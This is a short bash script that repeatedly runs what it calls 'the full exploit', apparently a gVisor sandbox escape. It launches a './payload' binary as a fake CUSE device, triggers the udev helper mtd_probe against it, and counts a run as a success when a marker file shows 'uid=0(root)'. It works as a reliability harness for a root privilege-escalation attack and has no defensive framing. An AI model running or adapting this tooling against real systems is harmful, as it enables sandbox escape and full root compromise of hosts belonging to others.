#!/bin/bash
# run3.sh: run the full exploit 3 times uninstrumented; require 3/3 pwned
set -eu
cd /home/user/gvisor-esc
SUCC=0
for i in 1 2 3; do
    NAME="mtdrnd$((RANDOM % 1000))ro"
    rm -f /tmp/gvisor-esc-pwned
    ./payload --dev /dev/cuse "$NAME" > /tmp/cuse_run.log 2>&1 &
    DPID=$!
    sleep 1
    /usr/lib/udev/mtd_probe /dev/"$NAME" >/dev/null 2>&1 || true
    sleep 1
    if [ -f /tmp/gvisor-esc-pwned ] && grep -q "uid=0(root)" /tmp/gvisor-esc-pwned; then
        SUCC=$((SUCC+1))
        echo "run $i: SUCCESS"
    else
        echo "run $i: FAIL"
        cat /tmp/cuse_run.log
    fi
    kill $DPID 2>/dev/null || true
    sleep 0.5
done
echo "RESULT: $SUCC/3"
